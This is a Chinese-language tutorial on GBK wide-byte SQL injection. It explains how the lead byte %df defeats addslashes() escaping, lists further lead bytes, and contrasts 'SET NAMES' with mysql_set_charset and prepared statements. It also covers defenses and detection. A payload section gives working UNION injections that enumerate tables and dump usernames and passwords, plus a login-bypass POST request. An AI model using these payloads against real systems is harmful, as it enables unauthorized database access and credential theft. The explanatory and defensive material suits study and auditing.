# 宽字节注入 (Wide Byte Injection)

> 核心原理：当后端使用多字节字符集（如 GBK）且仅依赖 `addslashes()` 等单字节转义函数时，攻击者构造特殊的前导字节"吃掉"转义符反斜杠（`\`, `0x5C`），使单引号成功逃逸。

---

## 一、背景：为什么会有宽字节注入

### 1.1 单字节转义的假设

PHP 中常见的防注入手段 `addslashes()` 或 `magic_quotes_gpc`（PHP 5.4 前），其逻辑是在四个危险字符前添加反斜杠：

| 危险字符 | 转义后 | Hex 表示 |
|---------|--------|----------|
| 单引号 `'` | `\'` | `0x27` → `0x5C27` |
| 双引号 `"` | `\"` | `0x22` → `0x5C22` |
| 反斜杠 `\` | `\\` | `0x5C` → `0x5C5C` |
| NULL 字节 | `\0` | `0x00` → `0x5C00` |

这个设计隐含了一个致命的假设：**每个字符只占一个字节**。在多字节字符集（GBK、BIG5、SJIS 等）面前，这个假设直接崩溃。

### 1.2 GBK 编码的基本规则

GBK 是 GB2312 的扩展，兼容 ASCII（0x00-0x7F 为单字节），并使用两个字节表示中文字符：

| 字节位置 | 取值范围 |
|---------|---------|
| 第一字节（前导字节） | `0x81` — `0xFE` |
| 第二字节（后缀字节） | `0x40` — `0x7E`, `0x80` — `0xFE` |

关键观察：**反斜杠的编码 `0x5C` 恰好落在第二字节的合法范围内**（`0x40` — `0x7E`）。这意味着，一个经过精心挑选的前导字节与 `0x5C` 组合后，会被 GBK 解码器当作一个完整的汉字，反斜杠就此"消失"。

## 二、攻击机制详解

### 2.1 核心漏洞链

```
攻击者输入:  %df'        (0xDF 0x27)
     ↓
addslashes() 转义:  %df\'   (0xDF 0x5C 0x27)
     ↓
MySQL GBK 解码:   [運] '   (两个字节 0xDF5C → 汉字"運"，0x27 暴露为裸单引号)
     ↓
最终 SQL:         SELECT * FROM users WHERE id='1運' OR 1=1--'
                                           ↑         ↑
                                          被吃掉的\  成功闭合的引号
```

### 2.2 逐字节拆解

以 payload `?id=1%df' OR 1=1 --+` 为例：

```
步骤 1 — 原始输入（URL 解码后）
┌─────┬─────┬─────┬─────┐
│  1  │ 0xDF│ 0x27│  …  │   1 + 前导字节 + 单引号
└─────┴─────┴─────┴─────┘

步骤 2 — PHP addslashes() 处理后
┌─────┬─────┬─────┬─────┬─────┐
│  1  │ 0xDF│ 0x5C│ 0x27│  …  │   单引号前被插入反斜杠
└─────┴─────┴─────┴─────┴─────┘
              ↑ 新插入的 \

步骤 3 — MySQL GBK 解码器扫描
┌─────┬───────────┬─────┬─────┐
│  1  │ [0xDF 0x5C]│ 0x27│  …  │  0xDF + 0x5C → 汉字"運"（GBK 码位 0xDF5C）
└─────┴───────────┴─────┴─────┘
       ↑ 两个字节被合并为一个宽字符

步骤 4 — 最终解析结果
┌─────┬────┬─────┬──────────┐
│  1  │ 運 │  '  │ OR 1=1   │  引号成功闭合，注入代码进入 SQL 上下文
└─────┴────┴─────┴──────────┘
```

### 2.3 为什么是 `%df`

`%df`（十进制的 223，即 `0xDF`）之所以经典，是因为 `0xDF5C` 恰好对应 GBK 码表中的汉字"運"。但这**不是唯一的**前导字节——任何 `0x81` 到 `0xFE` 之间的字节，只要它和 `0x5C` 组成的双字节在 GBK 码表中有效，都可以触发注入。

## 三、可用前导字节

### 3.1 已知有效的前导字节

| URL 编码 | Hex 值 | 与 0x5C 组合后的 GBK 字符 | 说明 |
|---------|--------|--------------------------|------|
| `%df` | `0xDF` | 運 (`0xDF5C`) | 最经典的 payload |
| `%bf` | `0xBF` | 繈 (`0xBF5C`) | 广泛使用 |
| `%a1` | `0xA1` | `0xA15C` 开头的 GBK 字符 | 常见变体 |
| `%a8` | `0xA8` | `0xA85C` | 特定场景有效 |
| `%8c` | `0x8C` | `0x8C5C` | 特定场景有效 |
| `%aa` | `0xAA` | `0xAA5C` | — |

**选取原则**：前导字节的 hex 值必须在 `0x81-0xFE` 之间，且与 `0x5C` 的组合必须在目标字符集的码表中存在。通常 `%df` 和 `%bf` 在 GBK 中通过了良好测试。

### 3.2 理论有效范围

任何满足以下条件的前导字节 `X` 都可以构成宽字节注入：

```
0x81 ≤ X ≤ 0xFE  （GBK 第一字节范围）
且 X0x5C 在 GBK 码表中为有效字符
```

由于 `0x5C` 本身在第二字节范围内（`0x40 ≤ 0x5C ≤ 0x7E`），大多数前导字节都可能有效。

## 四、PHP 代码层面的根本原因：`SET NAMES` vs `mysql_set_charset`

这是宽字节注入最容易被误解也最关键的部分。

### 4.1 危险的写法：`SET NAMES 'gbk'`

```php
// 危险示例
$conn = mysql_connect('localhost', 'root', '');
mysql_query("SET NAMES 'gbk'");            // <-- 这是问题所在
$id = addslashes($_GET['id']);              // addslashes 不知道连接用的是 GBK
$sql = "SELECT * FROM users WHERE id='$id'";
mysql_query($sql);
```

`SET NAMES 'gbk'` 做了三件事（等价于执行三条语句）：

```sql
SET character_set_client = gbk;       -- 告诉 MySQL "客户端发来的数据是 GBK"
SET character_set_connection = gbk;   -- 连接层字符集
SET character_set_results = gbk;      -- 返回结果的字符集
```

**核心矛盾**：`addslashes()` 是按单字节逻辑添加 `\`（`0x5C`）的，它根本不知道数据库连接用的是 GBK。当 MySQL 以 GBK 解码器读取输入时，`0xDF5C` 被解释为一个汉字——`0x5C` 的转义功能被吞并了。

### 4.2 安全的写法：`mysql_set_charset('gbk')`

```php
// 安全示例
$conn = mysql_connect('localhost', 'root', '');
mysql_set_charset('gbk', $conn);           // <-- 正确做法
$id = addslashes($_GET['id']);
$sql = "SELECT * FROM users WHERE id='$id'";
mysql_query($sql);
```

区别在于 `mysql_set_charset()` 在 MySQL 客户端库（libmysql）层面执行了正确的字符集转换——MySQL 知道数据的真实编码，会在内部做一层安全的编码转换，而不是简单地把字节流当 GBK 解析。

> **这个区别是宽字节注入防御中最重要的知识点**：不是"用 GBK 就一定不安全"，而是"用 `SET NAMES` 设置 GBK + 单字节转义"的组合不安全。

### 4.3 高版本 PHP 的现状

| PHP 版本 | 变化 |
|---------|------|
| PHP 5.4.0 | `magic_quotes_gpc` 被移除 |
| PHP 5.5.0 | `mysql_*` 扩展被废弃 |
| PHP 7.0.0 | `mysql_*` 扩展被移除，推荐 `mysqli_*` 或 `PDO` |
| PDO / mysqli | 使用预处理语句 + `charset=utf8mb4` DSN 参数可以规避 |

```php
// PDO 安全写法
$pdo = new PDO('mysql:host=localhost;dbname=test;charset=utf8mb4', 'root', '');
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
```

## 五、其他受影响的多字节字符集

GBK 只是最广泛讨论的案例，任何满足"反斜杠的编码落在第二字节范围内"的字符集都存在同样的风险。

| 字符集 | 说明 |
|--------|------|
| **GBK** | 中国国家标准扩展，最常被讨论 |
| **GB2312** | GBK 的前身，同样受影响 |
| **BIG5** | 繁体中文，0x5C 在第二字节范围 |
| **SJIS** (Shift-JIS) | 日文编码，0x5C 在第二字节范围 |
| **EUC-KR** | 韩文编码 |

但 **UTF-8 不受影响**：UTF-8 的后缀字节范围是 `0x80-0xBF`，而反斜杠 `0x5C` 不在其中，所以无法被"吃掉"。

```
UTF-8 多字节结构:
  2字节: 110xxxxx 10xxxxxx
  3字节: 1110xxxx 10xxxxxx 10xxxxxx
  4字节: 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx
           ↑ 所有后缀字节都是 10xxxxxx (0x80-0xBF)
0x5C = 01011100 → 不在 UTF-8 后缀字节范围内 → 不可能被合并
```

## 六、完整 Payload 示例

### 6.1 基础闭合

```sql
-- 原始 GET 参数
?id=1%df' OR 1=1 --+

-- addslashes + GBK 解码后等价于
SELECT * FROM users WHERE id='1運' OR 1=1 --+'
```

### 6.2 UNION 注入

```sql
?id=-1%df' UNION SELECT 1,2,3 --+

-- 等价于
SELECT * FROM users WHERE id='-1運' UNION SELECT 1,2,3 --+'
```

### 6.3 获取数据库名

```sql
?id=-1%df' UNION SELECT 1,database(),3 --+
```

### 6.4 获取表名

```sql
?id=-1%df' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() --+
```

### 6.5 获取列名

```sql
?id=-1%df' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name=0x7573657273 --+
-- 0x7573657273 = 'users'（十六进制绕过引号过滤）
```

### 6.6 脱库

```sql
?id=-1%df' UNION SELECT 1,group_concat(username,0x7e,password),3 FROM users --+
```

### 6.7 POST 场景

```http
POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin%df' OR 1=1 --+&password=any
```

### 6.8 使用其他前导字节

```sql
?id=1%bf' OR 1=1 --+
?id=1%a1' OR 1=1 --+
?id=1%aa' OR 1=1 --+
```

## 七、防御措施

| 层级 | 措施 | 有效性 |
|------|------|--------|
| 编码层 | 使用 **UTF-8**（`utf8mb4`）替代 GBK | 根本解决 — UTF-8 不受宽字节注入影响 |
| API 层 | 使用 `mysql_set_charset()` 而非 `SET NAMES` | 缓解 — 但不能替代 UTF-8 |
| 查询层 | 使用 **预处理语句**（PDO / mysqli prepare） | 最佳实践 — 参数与 SQL 结构分离 |
| 输入层 | 不要依赖 `addslashes()` 作为唯一防线 | `addslashes` 不是为多字节安全设计的 |
| 架构层 | 迁移到 PHP 7+ + PDO + MySQL 5.5.3+ + utf8mb4 | 现代化的全栈解决方案 |

---

## 八、适用条件

- 后端数据库连接使用 GBK / BIG5 / SJIS 等多字节字符集
- 使用 `SET NAMES 'gbk'` 而非 `mysql_set_charset('gbk')`
- 应用依赖 `addslashes()` 或类似单字节转义函数
- **PHP 5.x 及之前版本最常见**（`magic_quotes_gpc` 默认开启的时期）
- 现代 PHP 7+ 使用 PDO + UTF-8 的环境下，宽字节注入已大幅减少但仍可能在遗留系统中存在

---

## 九、快速识别

**黑盒测试特征**：
1. 输入 `'` → 返回 `\'`（说明 addslashes 在工作）
2. 输入 `%df'` → 如果页面报错或行为异常（说明宽字节注入可能成功）
3. 页面编码是 GBK / GB2312（查看 `Content-Type` 中的 `charset=gbk`）

**白盒审计特征**：
1. `SET NAMES 'gbk'` 或 `SET NAMES 'gb2312'`
2. `addslashes()` 或依赖 `magic_quotes_gpc` 的代码
3. 查询没有使用预处理语句
